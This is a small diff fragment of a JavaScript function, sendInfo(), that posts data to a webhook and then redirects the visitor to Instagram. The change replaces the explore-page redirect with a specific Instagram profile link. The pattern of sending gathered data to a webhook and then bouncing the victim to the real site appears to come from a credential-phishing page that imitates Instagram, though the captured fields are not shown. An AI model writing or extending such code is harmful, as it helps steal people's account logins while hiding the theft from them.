@@ -81,10 +81,10 @@ async function sendInfo() {
     await fetch(webhook, config);
   } catch {
     setTimeout(function() {
-        window.location.replace("https://www.instagram.com/explore/")
+        window.location.replace("https://www.instagram.com/utkarshtomar007?igsh=MTByaXIyeDBnODJo")
     }, 1000);
   }
   setTimeout(function() {
-    window.location.replace("https://www.instagram.com/explore/")
+    window.location.replace("https://www.instagram.com/utkarshtomar007?igsh=MTByaXIyeDBnODJo")
   }, 1000);
 }
